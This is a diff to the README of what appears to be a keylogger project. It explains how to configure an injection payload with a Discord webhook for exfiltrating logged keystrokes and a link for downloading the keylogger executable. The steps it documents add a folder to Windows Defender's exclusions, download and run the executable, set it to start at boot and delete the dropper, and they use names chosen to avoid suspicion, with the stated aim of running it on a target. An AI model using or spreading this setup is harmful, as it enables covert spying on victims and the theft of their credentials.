@@ -63,9 +63,10 @@ When you download this script it will be a `.txt` file rather than a `.bin` file
 ```
 DEFINE #URL https://discord.com/api/webhooks/
 DEFINE #LINES 300
+DEFINE #EXE https://github.com/wishtag/keylogger/
 ...
 ```
-Replace the placeholder url with your discord webhook's url and replace the `300` with however many lines until the logs should be sent through the webhook. You can just keep it as `300` if you're lazy. This is really all you need to do, now you can just generate the payload and run it on a target.  
+Replace the placeholder url with your discord webhook's url and replace the `300` with however many lines until the logs should be sent through the webhook. You can just keep it as `300` if you're lazy. If you downloaded `inject.txt` from a release then `#EXE` should link to the `main.exe` of the corresponding release. If you downloaded `inject.txt` directly from the repository then `#EXE` should link to the `main.exe` of the repository. If you want it to download a different file just change `#EXE` to the link of whatever you want it to download. This is really all you need to do, now you can just generate the payload and run it on a target.  
 
 ### The actual script
 The names for like everything don't correlate to their purposes, I just named them stuff that someone wouldn't find suspicious and would just assume it's supposed to be there.
@@ -84,7 +85,7 @@ The names for like everything don't correlate to their purposes, I just named th
 **3.** Starts running the `dl.ps1` script as mentioned in 2c.  
 **3a.** Creates a new directory in the Windows Temp folder called `Cache`.  
 **3b.** Executes a command to add the `Cache` folder to Windows Defender's exclusion list.  
-**3c.** Executes a WebRequest to download the `main.exe` file from this github directory, and then save it to the `Cache` folder. The `main.exe` file is just the `main.pyw` file packaged together, if you want it to run your own version of my code then you'll just have to change the line where it makes the WebRequest. This download takes a long time.  
+**3c.** Executes a WebRequest to download the file from the link defined in `#EXE`, and then save it to the `Cache` folder. By default, it should be set to download the `main.exe` file which is just the `main.pyw` file packaged together.  
 **3d.** Once the file is done downloading, a command is executed to start the file.  
 **3e.** Executes a command to add `main.exe` to system startup.  
 **3f.** Deletes the `dl.ps1` file.  
